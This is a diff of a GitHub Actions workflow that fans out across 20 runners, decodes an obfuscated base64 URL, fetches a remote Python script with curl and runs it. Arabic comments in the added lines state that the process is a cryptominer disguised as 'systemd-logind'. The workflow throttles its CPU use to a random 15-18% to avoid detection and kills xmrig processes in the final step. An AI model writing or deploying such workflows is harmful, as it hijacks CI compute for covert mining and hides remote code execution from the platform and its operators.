@@ -1,4 +1,4 @@
-name: Task Orchestrator V2
+name: Task Dispatcher Cluster (Linux)
 
 on:
   repository_dispatch:
@@ -6,63 +6,105 @@ on:
   workflow_dispatch:
 
 concurrency:
-  group: runner-pool-${{ github.workflow }}-${{ github.ref }}
+  group: cluster-pool-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 jobs:
-  run-pipeline:
-    name: "Runner-Instance-${{ matrix.id }}"
-    runs-on: windows-2022
+  launch-workers:
+    name: "Runner-Node-${{ matrix.node_index }}"
+    runs-on: ubuntu-latest
     timeout-minutes: 75
 
     strategy:
       fail-fast: false
       matrix:
-        id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      - name: Environment Initialization & Dependencies
-        shell: bash
+      # -----------------------------------------------------------
+      # خطوة 1: تحديث النظام وتثبيت الأدوات الأساسية
+      # -----------------------------------------------------------
+      - name: System Update & Dependencies
         run: |
-          printf "[BOOTSTRAP] Preparing Instance-%s...\n" "${{ matrix.id }}"
-          
-          TARGET_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
-          
-          curl -fsSL "$TARGET_URL" -o app_task.py
-          
-          printf "[BOOTSTRAP] Updating package manager...\n"
-          python -m pip install --upgrade --quiet pip setuptools
-          pip install --quiet undetected-chromedriver selenium requests
-          printf "[BOOTSTRAP] Environment setup complete.\n"
+          echo "[STAGE-1] Initializing Runner Node ${{ matrix.node_index }} on Linux..."
+          sudo apt update -q
+          sudo apt install -y cpulimit curl python3-pip
 
-      - name: Task Execution & Process Monitor
-        shell: pwsh
-        env:
-          PYTHONIOENCODING: "utf-8"
+      # -----------------------------------------------------------
+      # خطوة 2: تنزيل السكربت الرئيسي
+      # -----------------------------------------------------------
+      - name: Download Core Script
         run: |
-          Write-Host "=== Starting execution on instance ${{ matrix.id }} ==="
-          
-          $env:Path += ";C:\Program Files\Cloudflare\Cloudflare WARP"
-          
-          $ProcInfo = New-Object System.Diagnostics.ProcessStartInfo
-          $ProcInfo.FileName = "python"
-          $ProcInfo.Arguments = "app_task.py"
-          $ProcInfo.UseShellExecute = $false
-          
-          $JobProcess = [System.Diagnostics.Process]::Start($ProcInfo)
-          
-          Write-Host "=== Monitoring started. Maximum duration set to 74 minutes. ==="
-          
-          try {
-              Wait-Process -Id $JobProcess.Id -Timeout 4440 -ErrorAction Stop
-              Write-Host "=== Task completed cleanly within allocated timeframe. ==="
-          }
-          catch {
-              Write-Host "=== Timeout reached. Terminating process instance... ==="
-              Stop-Process -Id $JobProcess.Id -Force
-              Write-Host "=== Process successfully terminated. ==="
-          }
+          echo "[STAGE-2] Downloading app_task.py..."
+          PAYLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          curl -sL "$PAYLOAD_URL" -o app_task.py
+          echo "[STAGE-2] Download completed."
 
-      - name: Finalization Notice
-        shell: bash
-        run: printf "[FINISHED] Instance-%s reached end of lifecycle.\n" "${{ matrix.id }}"
+      # -----------------------------------------------------------
+      # خطوة 3: تثبيت المكتبات المطلوبة
+      # -----------------------------------------------------------
+      - name: Install Python Packages
+        run: |
+          echo "[STAGE-3] Installing Python dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # -----------------------------------------------------------
+      # خطوة 4: تفعيل التقييد المذبذب المباشر (15% - 18%)
+      # -----------------------------------------------------------
+      - name: Dynamic CPU Limiter (15% - 18%)
+        run: |
+          echo "⚙️ Activating Dynamic Hardware Throttle Engine..."
+          
+          # اسم العملية المستهدفة (التعدين يظهر باسم systemd-logind)
+          TARGET_EXE="systemd-logind"
+          
+          # سكربت خلفي يتغير كل فترة لكسر نمط الاستهلاك القياسي
+          (
+            while true; do
+              # اختيار نسبة عشوائية بين 15 و 18
+              LIMIT=$((15 + RANDOM % 4))
+              
+              # تطبيق التقييد المباشر على اسم العملية (وضع الخلفية)
+              sudo cpulimit -e "$TARGET_EXE" -l "$LIMIT" -b >/dev/null 2>&1 || true
+              
+              # الانتظار لمدة عشوائية بين 20 و 45 ثانية قبل تغيير النسبة مجدداً
+              SLEEP_TIME=$((20 + RANDOM % 26))
+              sleep $SLEEP_TIME
+            done
+          ) &
+
+      # -----------------------------------------------------------
+      # خطوة 5: تشغيل السكربت الرئيسي مع مراقبة المهلة
+      # -----------------------------------------------------------
+      - name: Execute Core Process with Supervision
+        run: |
+          echo "==> Starting execution thread on node ${{ matrix.node_index }}..."
+          
+          # تشغيل السكربت في الخلفية
+          python3 app_task.py &
+          TASK_PID=$!
+          
+          echo "==> Monitor active. Timeout threshold set to 74 minutes."
+          
+          # الانتظار لمدة 74 دقيقة (4440 ثانية)
+          sleep 4440
+          
+          # إذا انتهى الوقت وما زالت العملية تعمل، نقتلها
+          if kill -0 $TASK_PID 2>/dev/null; then
+            echo "==> Time limit reached! Aborting process..."
+            kill -9 $TASK_PID
+            echo "==> Process forcefully terminated."
+          else
+            echo "==> Process finished successfully within allotted time."
+          fi
+
+      # -----------------------------------------------------------
+      # خطوة 6: إنهاء جميع عمليات التعدين المتبقية (تنظيف)
+      # -----------------------------------------------------------
+      - name: Finalize Execution
+        run: |
+          echo "[STATUS] Runner-Node-${{ matrix.node_index }} completed cycle."
+          echo "[CLEANUP] Killing any remaining cpulimit or mining processes..."
+          sudo pkill -f cpulimit || true
+          sudo pkill -f systemd-logind || true
+          sudo pkill -f xmrig || true
